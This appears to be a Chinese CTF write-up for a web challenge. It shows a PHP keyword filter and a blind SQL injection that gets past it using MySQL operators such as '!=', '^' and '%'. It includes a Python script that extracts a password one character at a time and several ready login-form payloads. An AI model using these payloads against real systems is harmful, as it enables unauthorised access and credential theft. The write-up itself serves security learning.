### web300-2  writeUp 

-----------------------------

此题目很有意思,关键是是sql注入,最后的命令执行,很简单送分题

主要sql注入的过滤函数:

```php
function sql_clean($str){
		if(is_array($str)){
			echo "<script> alert('not array!!@_@');parent.location.href='index.php'; </script>";exit;
		}
		$filter = "/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";  
		
        //由于在mysql中认为 %a0 也是空格,所以这里也需要过滤, 
		//在这里做了修改,添加 %a0

		if(preg_match($filter,$str)){
			echo "<script> alert('illegal character!!@_@');parent.location.href='index.php'; </script>";exit;
		}else if(strrpos($str,urldecode("%00"))){
			echo "<script> alert('illegal character!!@_@');parent.location.href='index.php'; </script>";exit;
		}
		return $this->str=$str;
	}
```
感觉啥都过滤了啊,怎么玩?:


但是仔细想想,我们好像还有操作符啊:
```
!,!=,=,+,-,^,%,>,<,~
```
我们是否可以通过这些操作符构造出来可以的注入判断语句呢?

看图:
![1.png](./images/1.png)

为啥会这样呢?

先看第一个语句:
```sql
select user from mysql.user where user=''=0
```
因为  where user='' 是返回0,然后0=0就会返回1,所有返回了所有的用户
第二条语句同样的道理.
所以我们我们就用`!=`号来构造判断条件,从数据库中读取数据
```
select  user  from mysql.user where user=''!=(mid((user)from(-1))='t')
```
如果 (mid((user)from(-1))='t') 返回的是0,那么整个判断就会返回false,如果是1,我们就查到数据了.

所以我们可以POST提交:
```
uname='!=(mid((passwd)from(-1))='e')='1&passwd=1
```
这样一位一位猜出来passwd
python代码实现:
```python
#!/usr/bin/python
# -*-  coding:utf-8 -*- 
import requests 
url = "http://127.0.0.1/web200/login.php"

randstr = "0123456789abcdef"
remark=""
proxy = {"http":"127.0.0.1:8080"}
for j in range(1,33):
    for i in randstr:
        passwd = i+remark
        uname = "'!=(mid((passwd)from(-{j}))='{passwd}')='1".format(j=str(j),passwd=passwd)
        data = {"uname":uname,"passwd":"ddd"}
        # print uname
        res = requests.post(url,data)
        if "password error!!" in res.text:
            remark = passwd
            print remark
            break
```
下面说几个别的可用的payload:
原理和上面差不多:
```
select  user  from mysql.user where user=''%( mid((user)from(-1))='t')='1';
-> uname='%(mid((passwd)from(-1))='e')='1&passwd=1
```

```
select  user  from mysql.user where user=''^!( mid((user)from(-1))='t')='1' ;
-> uname='^!(mid((passwd)from(-1))='e')='1&passwd=1
```

```
select  user  from mysql.user where user=''+!( mid((user)from(-1))='t')='1';
->  uname='%2b!(mid((passwd)from(-1))='e')='1&passwd=1
注意加号用url编码 
```

```
select  user  from mysql.user where user=''-!( mid((user)from(-1))='t')='1';
-> uname='%2d!(mid((passwd)from(-1))='e')='1&passwd=1
```

```
select * from admin where uname=''<(mid((passwd)from(-1))='5')='1';
-> uname='<(mid((passwd)from(-1))='5')='1&passwd=1
```

看下面这个sql语句,理解一下:

```sql
select user from mysql.user  where user=~'18446744073709551615';
```